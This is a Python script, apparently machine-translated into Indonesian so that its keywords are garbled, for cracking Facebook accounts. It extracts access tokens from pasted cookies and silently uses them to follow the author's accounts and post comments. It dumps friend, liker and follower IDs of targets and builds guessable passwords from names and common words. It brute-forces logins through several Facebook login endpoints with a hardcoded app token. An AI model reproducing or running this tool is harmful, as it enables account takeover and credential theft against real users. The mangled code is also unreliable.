#!/usr/bin/python3
#coding=utf-8

## Buka Resource Code Buat Belajar Lu Ye. Kalo Mau Recode, Recode Ajah Tapi Ngotak :)

#Tinggalkan Jejak Anda Dengan Cara Tag Nama Recodernya :)

############################################################# ####
# #
# Kode ulang? boleh #
# #
# Yang Penting Bot Follow Jangan Di Ganti! #
# #
# Dibuat Oleh mr patrix ,indo orbxd #
# #
# Tipe Python3 #
# #
# Nama File: IDRE.py #
# #
# Github: https://www.github.com/Bang-Jack123#
# #
############################################################# ####


permintaan impor,mekanisasi,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
dari randint impor acak
dari kutipan impor urllib.parse
dari bersamaan.futures mengimpor ThreadPoolExecutor sebagai ThreadPool
dari bs4 impor BeautifulSoup sebagai parser
dari tanggal impor datetime
dari datetime impor datetime
saat ini = datetime.now()

# mengetik otomatis
def mengetik(z):
   untuk e dalam z + "\n":
       sys.stdout.write(e)
       sys.stdout.flush()
       waktu.tidur(0.05)

### kode warna
p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" di sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
kalau tidak:

        N = ""
        G = ""
        O = ""
        R = ""

### KEPALA ###
spanduk def():
	mencetak("""
\033[32;1m _ ___ _ _ _____ ___ _
 | |/ / _ \| \ | |_ _/ _ \| |
 | ' / | | | \| | | || | | | |
 | . \ |_| | |\ | | || |_| | |___
 |_|\_\___/|_| \_| |_| \___/|_____|
   • BANNER NYA BAGUS YA BUND • """)
cetak (spanduk)
os.system('hapus')
mengetik('\033[36;1mSemangat crack ngab ngga ad akun facebook yang aman')
mengetik('Kita habis kan akun facebook chekpoint awok_awok')
mengetik('Rekode gapapa Karna gue juga rekode cuma tambahin dikit')
mengetik('_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_ +_+_+_+')
ua="NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+"
ua2="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC /it_IT;FBAV/239.0.0.10.109;]"
host="https://mbasic.facebook.com"
ips=Tidak ada
mencoba:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":" application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["negara"].lower()
kecuali:
	ips=Tidak ada

oke = []
cp = []
ttl =[]

freefacebook = "https://free.facebook.com" #Metode Perbarui!

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = sekarang.tahun
bulan = saat ini.bulan
hari = hari ini.hari

br = mekanisasi.Browser()
br.set_handle_robots(Salah)
br.set_handle_refresh(mekanisasi._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

def jalan(z):
	untuk e dalam z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		waktu.tidur(0.03)

jelas ():
	jika "linux" di sys.platform.lower():
		os.system("hapus")
	elif "menang" di sys.platform.lower():
		os.system("cls")
	lain:os.system("hapus")
    
def lang (kue):
	f=Salah
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	untuk saya di rr.find_all("a",href=True):
		jika "id_ID" di i.get("href"):
			request.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda sekarang" di b.lower():
				f=Benar
	jika f==Benar:
		kembali Benar
	kalau tidak:
		exit(p+" ["+k+"•"+m+"•"+p+"] Cookie Salah")

def basecookie():
	jika os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			kembali get_dict_cookies(open('.cok').read().strip())
		lain: log()
	lain: log()

def hdcok():
	tuan rumah global, ua
	tuan rumah = tuan rumah
	r={"Origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": " Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT; FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login /?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	kembali r

def get_cookies(cookies):
	hasil=[]
	untuk saya di enumerate(cookies.keys()):
		if i[0]==len(daftar(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	kembali "".join(hasil)

def mendapat_dict_cookies(cookie):
	hasil={}
	mencoba:
		untuk saya di cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		hasil kembali
	kecuali:
		untuk saya di cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		hasil kembali

 
### Hubungi IG ####
def ige():
    os.system("hapus")
    spanduk()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Buka Instagram? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Buka Instagram...")
    os.system("xdg-buka https://www.instagram.com/ngemry7")
    masukan(p+" [KEMBALI]")
    log()   

### AMBIL TOKEN ###
def kontolrecode():
    os.system("hapus")
    spanduk()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Buka Youtube? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Buka Youtube...")
    os.system("xdg-buka https://youtube.com/channel/UCbOYxt4HRGh7UJ48a16qP_g")
    masukan(p+" [KEMBALI]")
    log()   

    
### METODE LOGIN ###
log def():
  os.system("hapus")
  spanduk()
  cetak ("")
  print((p+" ["+k+"01"+p+"] Login Menggunakan Token"))
  print((p+" ["+k+"02"+p+"] Masuk Menggunakan Cookie"))
  print((p+" ["+k+"03"+p+"] Tonton Cara Ambil Cookie"))
  
  print((p+" ["+k+"04"+p+"] Hubungi Penulis"))
  print((p+" ["+k+"00"+p+"] Keluar\n"))
  sek=input(p+" ["+k+"•"+m+"•"+p+"] Pilih: ")
  jika sek ="":
    print((p+" ["+k+"•"+m+"•"+p+"] Isi Yang Benar"))
    log()
  elif sek=="1" atau sek=="01":
    log_token()
  elif sek=="2" atau sek=="02":
    gen()
  elif sek=="3" atau sek=="03":
    kontolrecode()
  elif sek=="4" atau sek=="04":
    gambar()
  elif sek=="0" atau sek=="00":
    keluar()
  kalau tidak:
    print((p+" ["+k+"•"+m+"•"+p+"] Isi Yang Benar"))
    log()

#### METODE LOGIN TOKEN :)
# Jangan Hapus Nanti Eror! Kalo Gak Percaya Silahkan Hapus :V

def log_token():
    os.system("hapus")
    spanduk()
    token = input(p+"\n ["+k+"•"+m+"•"+p+"] Token: ")
    mencoba:
        otw = request.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.teks)
        nama = a["nama"]
        zedd = buka("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((p+" ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
        jalan((p+" ["+k+"•"+m+"•"+p+"] Silakan Berlangganan Saluran Saya :)"))
        os.system('xdg-open https://youtube.com/channel/UCbOYxt4HRGh7UJ48a16qP_g')
        bot_ikuti()
        Tidak bisa()
    kecuali KeyError:
        print((p+"\n ["+k+"•"+m+"•"+p+"] Token Tidak Valid"))
        #os.system("xdg-buka https://youtu.be/qhxw5BVUBlE")
        log()

def gen():
        os.system("hapus")
        spanduk()
        cookie = input(p+"\n ["+k+"•"+m+"•"+p+"]"+p+" Cookies: ")
        mencoba:
                data = request.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer" : "https://m.facebook.com/",
                "host" : "m.facebook.com",
                "asal" : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control" : "max-age=0",
                "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type" : "text/html; charset=utf-8"
                }, kue = {
                "kue" : kue
                })
                find_token = re.search("(EAA\w+)", data.text)
                hasil = "\n * Cookie Tidak Valid !!" if (find_token is None) else "\n* Token akses fb Anda : " + find_token.group(1)
        kecuali request.exceptions.ConnectionError:
                print((p+"\n ["+k+"•"+m+"•"+p+"] Tidak Ada Koneksi"))
        cookie = buka("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.tutup()
        print((p+"\n ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
        jalan((p+" ["+k+"•"+m+"•"+p+"] Silakan Berlangganan Saluran Saya :)"))
        #
        os.system('xdg-open https://youtube.com/channel/UCbOYxt4HRGh7UJ48a16qP_g')
        bot_ikuti()
        Tidak bisa()


komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Bjir BiiDev Femes Cuk Gua Ampe Mrinding", "Tumben Post Bang?", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])


kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?", "moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang",,"tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
komen = komtwol
komendua = kazutora
posting = "3909741969124574"
postdua = "4134869446611824"
def bot_follow():
	mencoba:
		toket=buka("login.txt",,"r").read()
		otw = request.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.teks)
		nama = a["nama"]
		id = a["id"]
	kecuali IOError:
		print((p+" ["+k+"•"+m+"•"+p+"] Token Tidak Valid"))
		log()
	request.post('https://graph.facebook.com/' + post + '/comments/?message=' + komen +'&access_token=' + toket)
	request.post('https://graph.facebook.com/' + postdua + '/comments/?message=' + komendua + '&acces_token'+toket)
	request.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
	request.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Meyy
	request.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # Izhar
# request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak diketahui
# request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak diketahui
# request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak diketahui
# request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak diketahui
# request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak diketahui
	Tidak bisa()


### MENU UTAMA ###

menu def():
    global ua
    mencoba:
        toket = buka("login.txt",,"r").read()
        otw = request.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.teks)
        nama = a["nama_depan"]
        ttl = a["ulang tahun"]
        id = a["id"]
    kecuali Pengecualian sebagai e:
        print((p+" ["+k+"•"+m+"•"+p+" Kesalahan : %s"%e))
        log()
    ip = request.get("https://api.ipify.org").text
    os.system("hapus")
    spanduk()
    print((m+"\n ["+p+" Selamat Datang Pengguna \033[1;32m"+nama+m+" ]"+p))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" ID Anda : \033[1;32m"+id))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" TTL Anda : \033[1;32m"+ttl))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Anda Bergabung : \033[1;32m"+durasi))
    print((p+"\n ["+k+"01"+p+"]"+p+" ID Crack Dari Publik/Friendlist"))
    print((p+" ["+k+"02"+p+"]"+p+" Crack ID Dari Likers Post"))
    print((p+" ["+k+"03"+p+"]"+p+" ID Crack Dari Pengikut"))
    print((p+" ["+k+"04"+p+"]"+p+" Crack Nomor Telepon"))
    print((p+" ["+k+"05"+p+"]"+p+" Crack Email"))
    print((p+" ["+k+"06"+p+"]"+p+" Periksa Opsi Pos Pemeriksaan Akun"))
    print((p+" ["+k+"99"+p+"]"+p+" Hasil Retak"))
    print((p+" ["+k+"00"+p+"]"+p+" Keluar "))
    pilih_menu()

def pilih_menu():
	r=input(p+"\n ["+k+"•"+m+"•"+p+"] Pilih: ")
	jika r="":
		print((p+" ["+k+"•"+m+"•"+p+"] Isi Yang Benar"))
		Tidak bisa()
	elif r=="1" atau r=="01":
		publik()
	elif r=="2" atau r=="02":
		suka()
	elif r=="3" atau r=="03":
		mengikuti()
	elif r=="4" atau r=="04":
		angka_acak()
	elif r=="5" atau r=="05":
		acak_email()
	elif r=="6" atau r=="06":
		cek_opsi()
	elif r="99":
		ress()
	elif r=="0" atau r=="00":
		mencoba:
			os.system("rm -rf login.txt")
			keluar()
		kecuali Pengecualian sebagai e:
			print((p+" ["+k+"•"+m+"•"+p+"] Kesalahan %s"%e))
	kalau tidak:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Masukan Salah"))
		Tidak bisa()	

def pilihcrack(file):
  print("\n\033[0;91m [ \033[1;37mPilih Metode Crack\033[1;31m ]\033[1;37m")
  print((p+" ["+k+"01"+p+"] Crack Dengan Api.Facebook"))
  print((p+" ["+k+"02"+p+"] Crack Dengan Api.Facebook + TTL "))
  print((p+" ["+k+"03"+p+"] Crack Dengan Mbasic.Facebook"))
  print((p+" ["+k+"04"+p+"] Crack Dengan Mbasic.Facebook + TTL"))
  print((p+" ["+k+"05"+p+"] Retak Dengan Sentuhan.Facebook"))
  print((p+" ["+k+"06"+p+"] Retak Dengan Sentuhan.Facebook + TTL "))
  print((p+" ["+k+"07"+p+"] Retak Dengan M.Facebook "))
  print((p+" ["+k+"08"+p+"] Retak Dengan M.Facebook + TTL "))
  print((p+" ["+k+"09"+p+"] Crack Dengan Gratis.Facebook "))
  print((p+" ["+k+"10"+p+"] Crack Dengan Gratis.Facebook + TTL "))
  print((p+" ["+k+"00"+p+"] Kembali Ke Menu "))
  krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Pilih : ")
  jika krah di[""]:
    print((p+" ["+k+"•"+m+"•"+p+"] Isi Yang Benar"))
    pilihcrack(berkas)
  elif krah di["1","01"]:
    bapi(berkas)
  elif krah di["2", "02"]:
    bapittl(berkas)
  elif krah di["3","03"]:
    retak (berkas)
  elif krah di["4","04"]:
    crackttl(berkas)
  elif krah di["5", "05"]:
    tofbe(berkas)
  elif krah di["6", "06"]:
    tofbettl(berkas)
  elif krah di["7", "07"]:
    crekm (berkas)
  elif krah di["8", "08"]:
    crekmttl(berkas)
  elif krah di["9","09"]:
    freefb(berkas)
  elif krah di["10"]:
    freefbttl(berkas)
  elif krah di["0","00"]:
    Tidak bisa()
  kalau tidak:
    print((p+" ["+k+"•"+m+"•"+p+"] Isi Yang Benar"))
    pilihcrack(berkas)

### ID DUMP ###

def publik():
	mencoba:
		toket=buka("login.txt",,"r").read()
	kecuali IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Tidak Valid"))
		os.system("rm -rf login.txt")
		log()
	mencoba:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Ketik \'saya\' Buang Dari Daftar Teman"))
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Target ID Pengguna: ")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Nama: "+op["nama"]))
		kecuali KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Tidak Ditemukan"))
			print((p+"\n [KEMBALI]"+p))
			Tidak bisa()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		identitas = []
		z=json.loads(r.teks)
		qq = (op["nama_pertama"]+".json").replace(" ","_")
		ys = buka(qq , "w")#.replace(" ","_")
		untuk a di z["data"]:
			id.append(a["id"]+"<=>"+a["nama"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.tutup()
		print((p+" ["+k+"•"+m+"•"+p+"] Jumlah ID : %s"%(len(id))))
		kembali pilihcrack(qq)
	kecuali Pengecualian sebagai e:
		keluar(p+"\n ["+k+"•"+m+"•"+p+"] Kesalahan : %s"%e)

pasti suka():
	mencoba:
		toket=buka("login.txt",,"r").read()
	kecuali IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Tidak Valid"))
		os.system("rm -rf login.txt")
		log()
	mencoba:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] ID Posting Target: ")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Nama: "+op["nama"]))
		kecuali KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Tidak Ditemukan"))
			print((p+"\n [KEMBALI]"+p))
			Tidak bisa()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		identitas = []
		z=json.loads(r.teks)
		qq = (op["nama_pertama"]+".json").replace(" ","_")
		ys = buka(qq , "w")#.replace(" ","_")
		untuk a di z["data"]:
			id.append(a["id"]+"<=>"+a["nama"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.tutup()
		print((p+" ["+k+"•"+m+"•"+p+"] Jumlah ID : %s"%(len(id))))
		kembali pilihcrack(qq)
	kecuali Pengecualian sebagai e:
		keluar(p+"\n ["+k+"•"+m+"•"+p+"] Kesalahan : %s"%e)

pasti mengikuti():
	mencoba:
		toket=buka("login.txt",,"r").read()
	kecuali IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Tidak Valid"))
		os.system("rm -rf login.txt")
		log()
	mencoba:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Target ID Pengikut : ")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Nama: "+op["nama"]))
		kecuali KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Tidak Ditemukan"))
			print((p+"\n [KEMBALI]"+p))
			Tidak bisa()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		identitas = []
		z=json.loads(r.teks)
		qq = (op["nama_pertama"]+".json").replace(" ","_")
		ys = buka(qq , "w")#.replace(" ","_")
		untuk a di z["data"]:
			id.append(a["id"]+"<=>"+a["nama"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.tutup()
		print((p+" ["+k+"•"+m+"•"+p+"] Jumlah ID : %s"%(len(id))))
		kembali pilihcrack(qq)
	kecuali Pengecualian sebagai e:
		keluar(p+"\n ["+k+"•"+m+"•"+p+"] Kesalahan : %s"%e)

### Krek Nomer su! ###
def random_numbers():
  data = []
  print((p+"\n ["+k+"•"+m+"•"+p+"] Angka Harus 5 Digit"))
  kode=str(input(p+" ["+k+"•"+m+"•"+p+"] Contoh : 92037\n"+p+" ["+k+"•"+m+"•"+p+"] Masukan Nomor: "))
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Nomor Harus 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Nomor Harus 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Jumlah : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) untuk e di [str(kode)+' '.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+k+"•"+m+"•"+p+"] Crack Dimulai, Mohon Tunggu...\n")
  dengan bersamaan.futures.ThreadPoolExecutor(max_workers=15) sebagai th:
    {th.submit(brute, user['user'], user['pw']): pengguna untuk pengguna dalam data}
  masukan(p+"\n [KEMBALI]"+p)
  Tidak bisa()

def random_email():
  data = []
  nama=input(p+" ["+k+"•"+m+"•"+p+"] Nama Target : ")
  domain=input(p+" ["+k+"•"+m+"•"+p+"] Pilih Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  daftar={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+k+"•"+m+"•"+p+"] Isi Yang Benar")) jika bukan domain di ['g','y','h'] kalau tidak ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Jumlah : "))
  setpw=input(p+" ["+k+"•"+m+"•"+p+"] Setel Kata Sandi : ").split(',')
  print("\033[1;37m ["+k+"•"+m+"•"+p+"] Crack Dimulai, Mohon Tunggu...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  dengan bersamaan.futures.ThreadPoolExecutor(max_workers=15) sebagai th:
    {th.submit(brute, user['user'], user['pw']): pengguna untuk pengguna dalam data}
  input("\n\033[1;37m [KEMBALI]")
  Tidak bisa()

def brute (pengguna, lulus):
  mencoba:
    untuk pw masuk:
      parameter={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': pengguna,
        'lokal': 'en_US',
        'sandi': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAAA)\w+', str(respons.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(pengguna), str(pw)))
        merusak
      elif 'www.facebook.com' di response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(pengguna), str(pw)))
        merusak
  kecuali: lulus


### SANDI ###

def menghasilkan (teks):
	hasil=[]
	ips global
	untuk nama di text.split("<=>"):
		jika len(nama)<3:
			melanjutkan
		kalau tidak:
			nama=nama.bawah()
			jika len(nama)==3 atau len(nama)==4 atau len(nama)==5:
				hasil.tambahkan(nama)
				hasil.tambahkan(nama+"123")
				hasil.tambahkan(nama+"123456")
			kalau tidak:
				hasil.tambahkan(nama)
				hasil.tambahkan(nama+"123")
				hasil.tambahkan(nama+"123456")
				jika "indonesia" di ips:
					result.append("sayang")
					result.append("anjing")
					result.append("bismillah")
					result.append("kontol")
					result.append("freefire")
					result.append("bangsat")
					result.append("bajingan")
	mengembalikan hasil

### MODUL CRACK ###

def mbasic(em,pas,hosts):
	r=permintaan.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent" :"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/ it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q= 0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	untuk saya di b("masukan"):
		jika i.get("nilai") adalah Tidak Ada:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("nama")=="lulus":
				data.update({"pass":pas})
			kalau tidak:
				data.update({i.get("name"):""})
		kalau tidak:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv= 100",data=data).teks
	jika "c_user" dalam daftar(r.cookies.get_dict().keys()):
		kembali {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" dalam daftar(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	lain:kembalikan {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	global ua
	r=permintaan.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent" :"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080, height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi -v7a;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",,"accept-encoding ":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	untuk saya di b("masukan"):
		jika i.get("nilai") adalah Tidak Ada:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("nama")=="lulus":
				data.update({"pass":pas})
			kalau tidak:
				data.update({i.get("name"):""})
		kalau tidak:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv= 100",data=data).teks
	jika "c_user" dalam daftar(r.cookies.get_dict().keys()):
		kembali {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" dalam daftar(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	lain:kembalikan {"status":"error","email":em,"pass":pas}
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=permintaan.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent" :"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml; q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q= 0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	untuk saya di b("masukan"):
		jika i.get("nilai") adalah Tidak Ada:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("nama")=="lulus":
				data.update({"pass":pas})
			kalau tidak:
				data.update({i.get("name"):""})
		kalau tidak:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv= 100",data=data).teks
	jika "c_user" di r.cookies.get_dict().keys():
		kembali {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "pos pemeriksaan" di r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb

def m_fb(em, pas, host):
    r = permintaan.Sesi()
